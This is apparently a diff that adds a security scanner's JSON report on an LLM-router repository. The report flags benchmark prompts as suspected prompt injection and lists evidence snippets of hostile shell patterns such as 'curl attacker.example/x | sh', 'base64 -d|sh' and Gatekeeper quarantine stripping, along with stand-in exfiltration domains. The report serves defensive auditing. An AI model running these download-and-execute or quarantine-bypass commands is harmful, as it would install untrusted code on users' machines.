+      "line": 1,
+      "evidence": "p=0.92 Examine the following questions, selecting the answer you deem most accurate fro",
+      "file_sha256": "ee256c3b4d28bee20d7206269029cdb01a47e80b427e1e7d0eb37d2668c604d3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-heads-robustness.json",
+      "line": 1,
+      "evidence": "p=0.93 Kindly scrutinize the ensuing multiple-choice inquiries and furnish the most pla",
+      "file_sha256": "ee256c3b4d28bee20d7206269029cdb01a47e80b427e1e7d0eb37d2668c604d3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-heads-robustness.json",
+      "line": 1,
+      "evidence": "p=0.95 Kindly examine the subsequent inquiry and supply the accurate response.\\u{a}\\u{a}Scenari",
+      "file_sha256": "ee256c3b4d28bee20d7206269029cdb01a47e80b427e1e7d0eb37d2668c604d3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-heads-robustness.json",
+      "line": 1,
+      "evidence": "p=0.91 You function as a comprehension tool for reading tasks. Your role involves addre",
+      "file_sha256": "ee256c3b4d28bee20d7206269029cdb01a47e80b427e1e7d0eb37d2668c604d3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-g3-robustness.json",
+      "line": 1,
+      "evidence": "p=0.94 Kindly examine the subsequent questions with multiple-choice options and deliber",
+      "file_sha256": "abff8c6c462ad71a8212a4e367dd363cf3e94fc768c500c8876db0b44ea743e4"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-g3-robustness.json",
+      "line": 1,
+      "evidence": "p=0.97 Examine the following set of multiple-choice inquiries to determine which select",
+      "file_sha256": "abff8c6c462ad71a8212a4e367dd363cf3e94fc768c500c8876db0b44ea743e4"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-g3-robustness.json",
+      "line": 1,
+      "evidence": "p=0.95 Kindly examine the ensuing multiple-choice inquiries and select the most plausib",
+      "file_sha256": "abff8c6c462ad71a8212a4e367dd363cf3e94fc768c500c8876db0b44ea743e4"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-g3-robustness.json",
+      "line": 1,
+      "evidence": "p=0.92 Examine the following questions, selecting the answer you deem most accurate fro",
+      "file_sha256": "abff8c6c462ad71a8212a4e367dd363cf3e94fc768c500c8876db0b44ea743e4"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-g3-robustness.json",
+      "line": 1,
+      "evidence": "p=0.93 Kindly scrutinize the ensuing multiple-choice inquiries and furnish the most pla",
+      "file_sha256": "abff8c6c462ad71a8212a4e367dd363cf3e94fc768c500c8876db0b44ea743e4"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-g3-robustness.json",
+      "line": 1,
+      "evidence": "p=0.95 Kindly examine the subsequent inquiry and supply the accurate response.\\u{a}\\u{a}Scenari",
+      "file_sha256": "abff8c6c462ad71a8212a4e367dd363cf3e94fc768c500c8876db0b44ea743e4"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-g3-robustness.json",
+      "line": 1,
+      "evidence": "p=0.91 You function as a comprehension tool for reading tasks. Your role involves addre",
+      "file_sha256": "abff8c6c462ad71a8212a4e367dd363cf3e94fc768c500c8876db0b44ea743e4"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/src/llm_router/write_policy.py",
+      "line": 20,
+      "evidence": "curl | sh",
+      "file_sha256": "e3e26e0d62ec82bb579daf64a76d97bd3e9dbf3585fbb900407fc7b211df41d2"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/src/llm_router/write_policy.py",
+      "line": 496,
+      "evidence": "base64 -d|sh",
+      "file_sha256": "e3e26e0d62ec82bb579daf64a76d97bd3e9dbf3585fbb900407fc7b211df41d2"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/src/llm_router/tools/local_task.py",
+      "line": 321,
+      "evidence": "curl evil.sh | sh",
+      "file_sha256": "3faaa67f84c3f1f7e111bf4b3e2eeafa0d963256222d47cf3f06b30151051624"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/src/llm_router/runtime_offer.py",
+      "line": 29,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "f855629106cd027d977f3d12965b68154351497d71835345523024ec1082e3bb"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/src/llm_router/prefer_grammar.py",
+      "line": 83,
+      "evidence": "\\u{202a}",
+      "file_sha256": "17c13141da451e604dcf38a414b3726a49bb55efa870393f1b74e2d2ed2f1a79"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/src/llm_router/hooks/auto-route.py",
+      "line": 1765,
+      "evidence": "curl x | sh",
+      "file_sha256": "b196137df99f47ee11d4ab003bcc8750510284dcf3b5390326574faae1fc2f7a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/src/llm_router/hooks/agent_writes.py",
+      "line": 35,
+      "evidence": "curl | sh",
+      "file_sha256": "3a2254778bc7c48a9a5ae8a406106577bb78798c4b904474fd00fb8e64cb644d"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/npm/install.js",
+      "line": 124,
+      "evidence": "xattr -dr com.apple.quarantine",
+      "file_sha256": "2420e325d1963d2cd0543caf73edf980196ce8cbcb6714257a12e95441009110"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/npm/README.md",
+      "line": 63,
+      "evidence": "xattr -dr com.apple.quarantine",
+      "file_sha256": "dd87d67e52310c681f8c7008daa7e1cd9e12e484539708f7b95e045f62630be2"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/hooks/auto-route.py",
+      "line": 1765,
+      "evidence": "curl x | sh",
+      "file_sha256": "b196137df99f47ee11d4ab003bcc8750510284dcf3b5390326574faae1fc2f7a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/docs/bugs/P2_9-a.md",
+      "line": 10,
+      "evidence": "curl|sh",
+      "file_sha256": "295445acdea20aa413961bf52116bbc94e9fd3bc51da86bb6c6629a3844d46e3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/docs/archive/PLAN_GAPS_REMEDIATION.md",
+      "line": 116,
+      "evidence": "curl|sh",
+      "file_sha256": "85960783a7ae105899a4d45a899480954e737f907dc8b4c647b70e3d8dd6f9e2"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/docs/archive/ACTIONS_REMEDIATION_RUN.md",
+      "line": 69,
+      "evidence": "curl|sh",
+      "file_sha256": "b045d70ee088dc074c8a6dbd6028feceeae3e2e7d2fdd07dab13b0a33ae4f0e8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/changelog.d/P2.9-b.added.md",
+      "line": 1,
+      "evidence": "curl | sh",
+      "file_sha256": "c6e862c6d2e9ba73931339b1f17b44c3523605641bd595f444375b7623b29c6c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/changelog.d/P2-8-ONBOARD-OFFER.added.md",
+      "line": 1,
+      "evidence": "curl ... | sh",
+      "file_sha256": "827110ef07c09d9100efbf699adac529d21c3aa868f4c48e22744c9c12f215c8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/changelog.d/F83.fixed.md",
+      "line": 1,
+      "evidence": "curl ... | sh",
+      "file_sha256": "8f8c5f143e2c04f449d98db4654afa32cbbd141cf731590ebc83d851a9821742"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/audit/forensic_2026-09-24/PROPOSED_README.md",
+      "line": 228,
+      "evidence": "curl | bash",
+      "file_sha256": "d7fab403d83fef6249ebd9fbbf5af45933403193c36c1fa3e694ec2098df6fe4"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/audit/forensic_2026-09-24/10_security_privacy.md",
+      "line": 53,
+      "evidence": "curl\\|sh",
+      "file_sha256": "30cfe6114c1e098fd8541fecaed64d84cd6fe61bbe074691104f50d3974369b4"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/audit/11_SECURITY_AUDIT.md",
+      "line": 45,
+      "evidence": "curl attacker.example/x | sh",
+      "file_sha256": "ffaadf1b01c0c5a5821c819a4050afaf377052b061e06e3ca7ab5a9a8b97a98e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/audit/03_FINDINGS.md",
+      "line": 69,
+      "evidence": "curl | sh",
+      "file_sha256": "f6500fe68cd1afaa7de2db6e9ddb5e5d761e9ab9ce4114cc7152e073c52c1d8b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/architecture/CURRENT_ARCHITECTURE.md",
+      "line": 126,
+      "evidence": "curl|sh",
+      "file_sha256": "1564c07a4c6efba55238dd0b21690f685841ede07b870e989cb2868187e53d64"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/.github/workflows/binary.yml",
+      "line": 98,
+      "evidence": "xattr -dr com.apple.quarantine",
+      "file_sha256": "cd400723d28437848c8bdd5838607f48f353f5a5915bc9d018a86dceaa92c81c"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "0.0.0.0",
+    "10.0.0.1",
+    "10.0.0.5",
+    "10.255.255.1",
+    "127.0.0.1",
+    "127.0.0.2",
+    "169.254.10.20",
+    "169.254.169.254",
+    "192.0.2.1",
+    "192.168.1.4",
+    "a.b",
+    "a.example",
+    "aistudio.google.com",
+    "api.anthropic.com",
+    "api.anthropic.com.evil.example",
+    "api.anthropic.com.evil.io",
+    "api.example.com",
+    "api.openai.com",
+    "api.telegram.org",
+    "api.together.ai",
+    "api.together.xyz",
+    "arxiv.org",
+    "attacker.example",
+    "b.example",
+    "chatgpt.com",
+    "claude.ai",
+    "collector.example",
+    "console.anthropic.com",
+    "console.groq.com",
+    "console.mistral.ai",
+    "console.x.ai",
+    "corp-proxy.internal",
+    "corp.example",
+    "dashboard.cohere.com",
+    "dev.runwayml.com",
+    "discord.com",
+    "docs.example.com",
+    "docs.python.org",
+    "elevenlabs.io",
+    "evil-exfil.example.net",
+    "evil.com",
+    "evil.example",
+    "evil.example.com",
+    "example.com",
+    "example.invalid",
+    "example.org",
+    "example.test",
+    "fake-ollama.invalid",
+    "fal.ai",
+    "files.pythonhosted.org",
+    "gateway.corp.example",
+    "gateway.example.net",
+    "generativelanguage.googleapis.com",
+    "github.com",
+    "gpu-box.invalid",
+    "gpu-box.lan",
+    "gpu.example.com",
+    "gpu.invalid",
+    "gutenberg.net",
+    "gw.example.com",
+    "hook.example",
+    "hooks.slack.com",
+    "huggingface.co",
+    "invalid.example",
+    "json-schema.org",
+    "localhost.evil.com",
+    "metadata.google.internal",
+    "my-server.com",
+    "o42.ingest.sentry.io",
+    "ollama.com",
+    "ollama.example.com",
+    "ollama.internal",
+    "ollama.internal.corp",
+    "ollama.remote.invalid",
+    "ollama.test",
+    "openai.com",
+    "openrouter.ai",
+    "other.example.com",
+    "pglaf.org",
+    "ping-target.invalid",
+    "platform.claude.com",
+    "platform.deepseek.com",
+    "platform.openai.com",
+    "platform.stability.ai",
+    "proxy.other",
+    "pypi.org",
+    "pypistats.org",
+    "raw.githubusercontent.com",
+    "registry.npmjs.org",
+    "schemas.microsoft.com",
+    "www.gutenberg.net",
+    "www.gutenberg.org",
+    "www.imsdb.com",
+    "www.perplexity.ai",
+    "www.pgdp.net",
+    "www.pglaf.org",
+    "www.yellbox.com",
+    "x.invalid",
+    "x.sh",
+    "zqx.example"
+  ],
+  "install_script": false,
+  "score": "critical"
+}
